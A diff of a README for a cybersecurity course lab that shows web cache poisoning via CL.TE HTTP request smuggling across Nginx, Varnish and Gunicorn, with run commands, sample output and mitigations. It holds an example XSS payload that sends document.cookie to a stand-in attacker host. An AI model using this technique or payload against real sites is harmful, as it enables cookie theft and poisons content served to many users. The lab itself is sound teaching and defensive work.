@@ -1,40 +1,73 @@
 # HRS-Desynchronization
 
-> **Cybersecurity Course Project** – Proof-of-Concept for a **CL.TE HTTP Request Smuggling** attack.  
-> Exploits parsing discrepancies between Nginx and Gunicorn to bypass a simulated security boundary and access a restricted `/admin` endpoint.
+> **Cybersecurity Course Project** – Professional lab demonstrating
+> **Web Cache Poisoning via CL.TE HTTP Request Smuggling** in a three-tier
+> architecture (Nginx → Varnish → Gunicorn/Flask).
 
 ---
 
-## Architecture
+## Architecture Overview
+
+```
+  ┌─────────────┐   port 80    ┌───────────────────┐  :6081  ┌──────────────────┐  :8000  ┌──────────────────────┐
+  │  Attacker   │──keep-alive─▶│  Nginx            │────────▶│  Varnish         │────────▶│  Gunicorn / Flask    │
+  │  attack.py  │              │  (frontend-proxy) │         │  (cache-layer)   │         │  (backend-origin)    │
+  └─────────────┘              │  Trusts CL        │         │  Caches .js/.css │         │  Trusts TE:chunked   │
+                               │  Forwards TE      │         │  1-hour TTL      │         │  /  /js/app.js       │
+                               └───────────────────┘         └──────────────────┘         │  /reflect?q=         │
+                                                                                           │  /admin              │
+                                                                                           └──────────────────────┘
+```
+
+### CL.TE Desynchronization – Buffer Poisoning Sequence
 
 ```mermaid
-flowchart LR
-    A[Attacker\nexploit.py] -->|Raw TCP / HTTP 1.1\nkeep-alive| B
+sequenceDiagram
+    participant A as Attacker<br/>(attack.py)
+    participant N as Nginx<br/>(frontend-proxy)
+    participant V as Varnish<br/>(cache-layer)
+    participant G as Gunicorn<br/>(backend-origin)
 
-    subgraph Docker Network
-        B["Frontend\n(Nginx :80)\n/admin → 403"]
-        B -->|Proxies /  \nforwards TE header| C["Backend\n(Gunicorn/Flask :8000)\n/admin → 200 Sensitive Data"]
-    end
+    Note over A,G: Phase 1 — Plant the smuggled prefix
+
+    A->>N: POST /js/app.js<br/>Content-Length: N<br/>Transfer-Encoding: chunked<br/><br/>[chunk data]<br/>0\r\n\r\n<br/>GET /reflect?q=PAYLOAD HTTP/1.1\r\nHost: ...\r\nX-Ignore: 
+    N->>V: Full POST body forwarded<br/>(Nginx trusts Content-Length)
+    V->>G: POST /js/app.js forwarded<br/>(Varnish passes through TE header)
+    Note over G: Gunicorn trusts TE:chunked<br/>Reads up to 0\r\n\r\n<br/>Leaves GET /reflect?q=... in socket buffer ⚠️
+    G-->>V: HTTP 200 OK (POST response)
+    V-->>N: 200 OK
+    N-->>A: 200 OK
+
+    Note over A,G: Phase 2 — Trigger the cache poisoning
+
+    A->>N: GET /js/app.js (same TCP connection)
+    N->>V: GET /js/app.js
+    V->>V: Cache MISS for /js/app.js
+    Note over V: Reuses keep-alive connection to Gunicorn
+    V->>G: GET /js/app.js (same socket as before)
+    Note over G: Socket buffer already contains<br/>GET /reflect?q=PAYLOAD ...\r\nX-Ignore: <br/>Gunicorn prepends it → processes GET /reflect?q=PAYLOAD
+    G-->>V: HTTP 200 OK<br/>Content: <html><body>PAYLOAD</body></html>
+    Note over V: Varnish caches this response<br/>under cache key: /js/app.js ⚠️
+    V-->>N: 200 OK (poisoned response)
+    N-->>A: 200 OK (poisoned response)
+
+    Note over A,G: Phase 3 — All users receive poisoned content
+
+    participant U as Victim User
+    U->>N: GET /js/app.js (new connection)
+    N->>V: GET /js/app.js
+    V->>V: Cache HIT 🎯
+    V-->>N: Cached poisoned response
+    N-->>U: <html><body>PAYLOAD</body></html>
 ```
 
-**Text-based ASCII diagram**
+### Header trust matrix
 
-```
-  ┌─────────────┐        port 80         ┌──────────────────┐       internal      ┌─────────────────────┐
-  │  Attacker   │ ──── keep-alive TCP ──▶ │  Nginx (frontend)│ ── HTTP/1.1 proxy ─▶│ Gunicorn/Flask (be) │
-  │  exploit.py │                         │  /admin → 403    │                     │  /admin → 200       │
-  └─────────────┘                         └──────────────────┘                     └─────────────────────┘
-```
-
-### How the attack works (CL.TE)
-
-| Actor | Header trusted | Body boundary |
-|-------|---------------|---------------|
-| **Nginx** (frontend) | `Content-Length` | Reads **all** N bytes and forwards them |
-| **Gunicorn** (backend) | `Transfer-Encoding: chunked` | Stops at `0\r\n\r\n` terminal chunk |
-
-The bytes **after** the terminal chunk (`GET /admin HTTP/1.1\r\nX-Ignore: x`) are left in the TCP socket buffer.  
-When the next (victim) request arrives on the **same keep-alive connection**, Gunicorn prepends those leftover bytes, rewriting the victim's request line to `/admin`.
+| Layer | Trusts | Ignores | Effect |
+|-------|--------|---------|--------|
+| **Nginx** (frontend-proxy) | `Content-Length` | `Transfer-Encoding` | Forwards entire body including smuggled suffix |
+| **Varnish** (cache-layer) | Forwards headers as-is | Does not strip TE | Passes the TE header to Gunicorn |
+| **Gunicorn** (backend-origin) | `Transfer-Encoding: chunked` | `Content-Length` | Stops at `0\r\n\r\n`, leaves prefix in socket buffer |
 
 ---
 
@@ -42,16 +75,25 @@ When the next (victim) request arrives on the **same keep-alive connection**, Gu
 
 ```
 HRS-Desynchronization/
-├── docker-compose.yml        # Defines frontend + backend services
+├── docker-compose.yml          # Three-tier service definitions
 ├── nginx/
-│   ├── Dockerfile            # Alpine Nginx image
-│   └── nginx.conf            # Reverse proxy config (desync-enabling)
+│   ├── Dockerfile              # nginx:1.25-alpine
+│   └── nginx.conf              # Desync-enabling (lenient) proxy config
+├── varnish/
+│   ├── Dockerfile              # alpine:3.19 + varnish package
+│   └── default.vcl             # Caches .js/.css for 1 h; passes TE to origin
 ├── backend/
-│   ├── Dockerfile            # Alpine Python 3.12 image
-│   ├── requirements.txt      # Flask + Gunicorn
-│   ├── app.py                # Flask routes: / and /admin
-│   └── wsgi.py               # Gunicorn config (keep-alive, sync worker)
-├── exploit.py                # Raw-socket CL.TE smuggling script
+│   ├── Dockerfile              # python:3.12-alpine
+│   ├── requirements.txt        # Flask + Gunicorn
+│   ├── app.py                  # Routes: / /js/app.js /reflect /admin
+│   └── wsgi.py                 # Gunicorn sync worker + keepalive config
+├── exploit/
+│   ├── attack.py               # CL.TE + cache-poisoning exploit (raw sockets + h2)
+│   └── requirements.txt        # h2>=4.0
+├── mitigation/
+│   ├── nginx.conf              # Hardened: reject dual-length headers, strip TE
+│   └── default.vcl             # Hardened: strip TE, Connection:close to origin
+├── exploit.py                  # (Legacy) two-tier CL.TE PoC (Nginx → Gunicorn)
 └── README.md
 ```
 
@@ -62,144 +104,145 @@ HRS-Desynchronization/
 ### Prerequisites
 
 - Docker ≥ 24 and Docker Compose v2
-- Python ≥ 3.10 (for `exploit.py`)
+- Python ≥ 3.10 with `pip` (for the exploit script)
 
 ### Start the stack
 
 ```bash
-# Build images and start containers in the background
+# Build images and start all three containers in the background
 docker compose up --build -d
 
-# Verify both containers are running
+# Verify all three containers are running
 docker compose ps
 ```
 
 Expected output:
 
 ```
-NAME                        STATUS          PORTS
-hrs-...-frontend-1          Up              0.0.0.0:80->80/tcp
-hrs-...-backend-1           Up              8000/tcp
+NAME                              STATUS          PORTS
+hrs-...-frontend-proxy-1          Up              0.0.0.0:80->80/tcp
+hrs-...-cache-layer-1             Up              6081/tcp
+hrs-...-backend-origin-1          Up              8000/tcp
 ```
 
-### Confirm the security boundary works
+### Confirm normal operation
 
 ```bash
-# Should return 403 Forbidden (Nginx blocks /admin directly)
-curl -i http://localhost/admin
-
-# Should return 200 with the public homepage
+# Public homepage
 curl -i http://localhost/
+
+# Static JavaScript file (first request: cache MISS)
+curl -i http://localhost/js/app.js
+
+# Reflection endpoint
+curl -i "http://localhost/reflect?q=hello"
 ```
 
 ---
 
-## Phase 2 – Exploit Execution
+## Phase 2 – Exploit: Web Cache Poisoning via CL.TE
+
+### Install exploit dependencies
 
 ```bash
-# Run the exploit against the local stack
-python exploit.py --host localhost --port 80
+pip install -r exploit/requirements.txt
+```
+
+### Run the attack
+
+```bash
+python exploit/attack.py --host localhost --port 80
+```
+
+With a custom payload:
+
+```bash
+python exploit/attack.py \
+  --host localhost \
+  --port 80 \
+  --payload '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'
 ```
 
 ### What happens step-by-step
 
-1. **Attack request** – A single `POST /` is sent with *both* `Content-Length` and `Transfer-Encoding: chunked`.  
-   Nginx trusts `Content-Length` and forwards the whole body.  
-   Gunicorn trusts `Transfer-Encoding` and stops at the `0\r\n\r\n` terminator, leaving  
-   `GET /admin HTTP/1.1\r\nX-Ignore: x` in the socket buffer.
+1. **Phase 0 (HTTP/2 probe)** – The exploit uses the `h2` library to check
+   whether the frontend also exposes an H2.CL smuggling surface.
 
-2. **Victim request** – A plain `GET /` is sent on the **same TCP connection**.  
-   Gunicorn prepends the buffered bytes, so it processes `GET /admin …` instead.
+2. **Phase 1 (CL.TE attack)** – A single `POST /js/app.js` is sent with both
+   `Content-Length` and `Transfer-Encoding: chunked`.
+   - Nginx trusts `Content-Length` and forwards every byte to Varnish.
+   - Varnish passes the request to Gunicorn.
+   - Gunicorn trusts `Transfer-Encoding`, stops at `0\r\n\r\n`, leaving
+     `GET /reflect?q=<payload>` in the keep-alive socket buffer.
 
-3. **Result** – The response to the victim request contains `Sensitive Admin Data`, proving  
-   the `/admin` security boundary was bypassed.
+3. **Phase 2 (trigger)** – A `GET /js/app.js` is sent on the **same TCP
+   connection**.  Varnish fetches from origin (cache MISS) on the same
+   keep-alive socket; Gunicorn prepends the smuggled prefix and returns the
+   `/reflect` response.  **Varnish caches this response under `/js/app.js`**.
+
+4. **Phase 3 (verify)** – A fresh connection requests `/js/app.js`.  Varnish
+   returns the poisoned cached response (`X-Cache: HIT`).
 
 ### Sample successful output
 
 ```
-[*] Target : localhost:80
-[*] Connecting …
-[*] Sending attack request (CL.TE smuggling) …
-...
-[*] Sending victim request …
-...
-[*] Response to victim request (should contain admin data if smuggling succeeded):
-HTTP/1.1 200 OK
-...
-Sensitive Admin Data
+[*] Target  : localhost:80
+[*] Payload : "<script>alert('Cache Poisoned!')</script>"
 
-[+] SUCCESS – smuggled /admin request reached the backend!
+[*] Phase 0 – Probing for HTTP/2 support (h2 library) …
+[*]  Server does not advertise HTTP/2 (or probe timed out).
+
+[*] Phase 1 – Sending CL.TE smuggling request …
+...
+
+[*] Phase 2 – Sending trigger GET /js/app.js (same connection) …
+...
+
+[*] Phase 3 – Verifying cache poisoning on a NEW connection …
+[*] Cached response for /js/app.js:
+HTTP/1.1 200 OK
+X-Cache: HIT
+...
+<html><body><script>alert('Cache Poisoned!')</script></body></html>
+
+[+] SUCCESS – /js/app.js cache is poisoned with the injected payload!
+    All users requesting /js/app.js will receive the attacker's content.
 ```
 
 ---
 
 ## Phase 3 – Mitigation
 
-### 3.1 Reject dual-length headers in Nginx
+Apply the hardened configuration files from the `mitigation/` directory:
 
-Replace the vulnerable `location /` block in `nginx/nginx.conf` with the hardened version below.  
-The key directive is `proxy_request_buffering on` combined with `ignore_invalid_headers off` and an explicit map that rejects requests that carry **both** `Content-Length` and `Transfer-Encoding`.
+```bash
+# Replace the vulnerable Nginx config
+cp mitigation/nginx.conf nginx/nginx.conf
 
-```nginx
-# nginx.conf (hardened)
+# Replace the vulnerable Varnish VCL
+cp mitigation/default.vcl varnish/default.vcl
 
-http {
-    # Reject requests that specify both Content-Length and Transfer-Encoding.
-    map $http_transfer_encoding $reject_dual_header {
-        default  0;
-        ~.+      $http_content_length;   # non-empty TE header
-    }
-
-    server {
-        listen 80;
-        server_name _;
-
-        # Block requests with conflicting length headers.
-        if ($reject_dual_header) {
-            return 400 "Ambiguous request rejected\n";
-        }
-
-        location /admin {
-            return 403 "Forbidden\n";
-        }
-
-        location / {
-            proxy_pass             http://backend:8000;
-            proxy_http_version     1.1;
-            proxy_set_header       Connection "";
-            proxy_set_header       Host $host;
-            proxy_set_header       X-Real-IP $remote_addr;
-            # Do NOT forward Transfer-Encoding to the backend.
-            proxy_set_header       Transfer-Encoding "";
-            proxy_request_buffering on;
-        }
-    }
-}
+# Rebuild and restart
+docker compose up --build -d
 ```
 
-### 3.2 Upgrade to HTTP/2
+### Mitigation summary
 
-HTTP/2 uses a binary, length-prefixed framing layer that eliminates header ambiguity entirely.  
-Enabling HTTP/2 on the Nginx frontend makes CL.TE and TE.CL attacks impossible at the protocol level.
+| Layer | Vulnerability | Mitigation |
+|-------|--------------|------------|
+| **Nginx** | Forwards both `Content-Length` and `Transfer-Encoding` | Reject requests with dual-length headers (HTTP 400); strip `Transfer-Encoding` before proxying; enable `proxy_request_buffering on` |
+| **Varnish** | Passes `Transfer-Encoding` to origin; reuses keep-alive sockets | Strip `Transfer-Encoding` in `vcl_backend_fetch`; set `Connection: close` on origin fetches; reject dual-length requests with a 400 synth |
+| **Gunicorn** | Trusts `Transfer-Encoding` over `Content-Length` | Addressed by removing TE from upstream headers (Nginx/Varnish mitigations) |
 
-```nginx
-server {
-    listen 443 ssl http2;
-    # ... TLS configuration ...
-}
-```
-
-> **Note:** HTTP/2 is only supported over TLS in most browsers, but backend proxying  
-> can still use HTTP/1.1 internally.
-
-### 3.3 Additional hardening recommendations
+### Additional hardening recommendations
 
 | Measure | Effect |
 |---------|--------|
-| Normalise TE headers in WAF/load-balancer | Strip or reject `Transfer-Encoding` variants (e.g. `chunked, identity`) |
-| Use a single authoritative parser | Deploy a unified proxy layer (e.g. Envoy) that buffers entire requests before forwarding |
-| Enable `merge_slashes off` + strict URI validation | Reduces attack surface for path confusion |
+| Enable HTTP/2 (`listen 443 ssl http2`) | Eliminates CL.TE/TE.CL ambiguity at the protocol level |
+| WAF: normalise TE headers | Strip/reject `Transfer-Encoding` variants before they reach proxies |
+| Single authoritative parser (e.g. Envoy) | Buffers entire requests before forwarding, preventing partial-write races |
 | Gunicorn `--forwarded-allow-ips` | Prevents forged `X-Forwarded-*` header injection |
+| Varnish `ban` on poisoned keys | Emergency response: purge known-poisoned cache entries immediately |
 
 ---
 
@@ -213,5 +256,7 @@ docker compose down
 
 ## Disclaimer
 
-This project is created **solely for educational purposes** as part of a cybersecurity course.  
-Do **not** use these techniques against systems you do not own or have explicit written permission to test.
+This project is created **solely for educational purposes** as part of a
+cybersecurity course.  Do **not** use these techniques against systems you do
+not own or have explicit written permission to test.
+
